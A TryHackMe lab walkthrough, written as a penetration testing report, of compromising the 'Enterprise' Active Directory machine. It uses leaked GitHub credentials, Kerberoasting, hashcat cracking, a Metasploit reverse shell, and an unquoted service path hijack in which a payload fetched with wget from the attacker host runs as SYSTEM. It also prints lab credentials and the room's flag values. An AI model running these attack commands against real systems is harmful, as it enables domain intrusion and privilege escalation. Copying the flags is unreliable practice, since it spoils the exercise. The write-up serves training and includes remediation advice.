# TryHackMe: Enterprise — Complete Walkthrough & Penetration Testing Report
Platform: TryHackMe
Target Machine: Enterprise
Target IP: 10.49.184.159   
Domain: LAB.ENTERPRISE.THM   

## Executive Summary
The Enterprise machine on TryHackMe demonstrates a complete active directory environment exploitation lifecycle—from initial reconnaissance and open-source intelligence leaks, to Kerberoasting, privilege escalation via unquoted service paths, and final compromise of the Domain Controller to retrieve both User and Root flags.   
1. Initial Reconnaissance & OSINT Leak
#### Step 1: Open-Source Intelligence GatheringDuring early enumeration, searching public repositories on GitHub revealed a commit history under the profile Nik-enterprise-dev containing hardcoded Active Directory credentials.   
- Discovered Username: ```nik```
- Discovered Password: ```ToastyBoi!```

2. Active Directory Exploitation (Kerberoasting)Using the initial credentials recovered from the GitHub leak (nik : ToastyBoi!), Kerberoasting was performed to discover service accounts configured with Service Principal Names (SPNs).
#### Step 1: Enumerating Service Principal Names
Impacket's GetUserSPNs.py was executed against the Domain Controller to identify valid SPNs:
```bash
python3 GetUserSPNs.py LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip 10.49.184.159
```
#### Enumeration Findings:
- Account Name: ```bitbucket```
- Service Principal Name (SPN): ```HTTP/LAB-DC```

#### Step 2: Requesting Kerberos TGS TicketTo extract the TGS ticket hash for offline cracking, ```GetUserSPNs.py``` was re-executed with the ```-request``` flag:   
```bash
GetUserSPNs.py LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -request
```
#### Step 3: Offline Hash Cracking with Hashcat
The extracted hash was saved to a local file (```hash```) and cracked using Hashcat against ```rockyou.txt``` using mode ```13000``` (Kerberos 5, etype 23, TGS-REP):   
```bash
hashcat -m 13000 hash /usr/share/wordlists/rockyou.txt
```
Cracked Credential Output:
- Username: ```bitbucket```
- Password: ```littleredbucket```

3. Lateral Movement & Staging
#### Step 1: Credential Validation via RDP
An interactive Remote Desktop session was tested using ```xfreerdp``` with the ```bitbucket``` user credentials:   
```bash
xfreerdp /v:LAB.ENTERPRISE.THM /u:bitbucket /p:littleredbucket
```
#### Step 2: Staging Attacker Resources
A local Python HTTP server was started on the attacker machine (```192.168.130.211```) to host privilege escalation scripts (```PowerUp.ps1```) and C2 payloads (```shell1.exe / shell.exe```):
```bash
python3 -m http.server 8000
```
#### Step 3: Configuring Metasploit Handler
Metasploit's ```multi/handler``` module was set up to capture incoming reverse shell connections:   
```plaintext
msfconsole -q
msf > use multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.130.211
msf exploit(multi/handler) > set lport 4444
msf exploit(multi/handler) > run
```
4. Privilege Escalation (Unquoted Service Path Exploitation)
#### Step 1: Enumerating Service Vulnerabilities
After transferring PowerSploit's ```PowerUp.ps1``` to the host, ```Get-UnquotedService``` identified a vulnerable Windows service with an unquoted executable path:   
```powershell
Import-Module .\PowerUp.ps1
Get-UnquotedService
```
Service Details:
- Service Name: ```zerotieroneservice```
- Service Binary Path: ```C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe```
- Run Context: ```LocalSystem```
- Write Permissions: ```BUILTIN\Users``` has write access to ```C:\Program Files (x86)\Zero Tier.```
- Restart Privileges: ```CanRestart: True```

#### Step 2: Binary Path Hijacking
Because the service path contains spaces and is unquoted, Windows checks for executable binaries in sequential order:   
  1. C:\Program.exe
  2. C:\Program Files (x86)\Zero.exe
  3. C:\Program Files (x86)\Zero Tier\Zero.exe
Navigating to ```C:\Program Files (x86)\Zero Tier```, a Meterpreter payload executable was downloaded and saved as ```Zero.exe```:   
```powershell
cd "C:\Program Files (x86)\Zero Tier"
wget "http://192.168.130.211:8000/shell.exe" -o Zero.exe
```
#### Step 3: Triggering SYSTEM Execution
The service was restarted, executing ```Zero.exe``` in the context of ```NT AUTHORITY\SYSTEM```:
```powershell
Stop-Service -Name zerotieroneservice
Start-Service -Name zerotieroneservice
```
5. Post-Exploitation & Process Migration
#### Step 1: Migration to Elevated Process
To ensure session stability before the service binary times out or stops, the active Meterpreter shell was immediately migrated to a stable system process (```winlogon.exe```):   
```plaintext
meterpreter > migrate -N winlogon.exe
[*] Migrating from 1116 to 548...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
6. Captured Flags
#### User Flag
Located on the user desktop:   
- Flag Value: ```THM{ed882d02b34246536ef7da79062bef36}```

### Root FlagRetrieved from the Administrator's desktop using SYSTEM access:   
- Flag Value: ```THM{1a1fa94875421296331f145971ca4881}```

#### Remediation & Mitigation Summary
1. Secret Management in Code Repositories: Enforce automated scanning tools (e.g., GitGuardian, Trufflehog) in CI/CD pipelines to block commits containing sensitive Active Directory credentials.
2. Service Account Security: Migrate Kerberoastable service accounts with SPNs to Group Managed Service Accounts (gMSAs) or enforce minimum 25-character passwords to defeat offline dictionary attacks.
3. Hardening Windows Service Paths: Enclose all Windows service binary executable paths containing spaces in double quotes within the Registry.
4. File System ACLs: Enforce restrictive permissions on C:\Program Files and C:\Program Files (x86) subdirectories to prevent non-administrative users (BUILTIN\Users) from creating binaries in service execution paths.   
